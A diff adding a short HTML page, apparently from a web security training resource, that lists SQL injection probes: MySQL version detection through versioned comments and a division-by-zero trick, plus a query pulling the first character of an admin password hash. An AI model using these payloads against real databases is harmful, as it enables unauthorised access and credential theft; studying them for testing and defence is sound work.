@@ -1,0 +1,18 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Specifics</title>
+</head><body>MySQL Version Detection Sample Attacks<br/>
+ID: /*!32302 10*/<br/>
+ID: 10 <br/>
+You will get the same response if MySQL version is higher than 3.23.02<br/>
+SELECT /*!32302 1/0, */ 1 FROM tablename <br/>
+Will throw a division by 0 error if MySQL version is higher than3.23.02<br/>
+<br/>
+<br/>
+<b>First byte of admin hash</b><br/>
+SELECT SUBSTRING(user_password,1,1) FROM mb_users WHERE user_group = 1;<br/>
+<br/>
+<br/>
+</body></html>
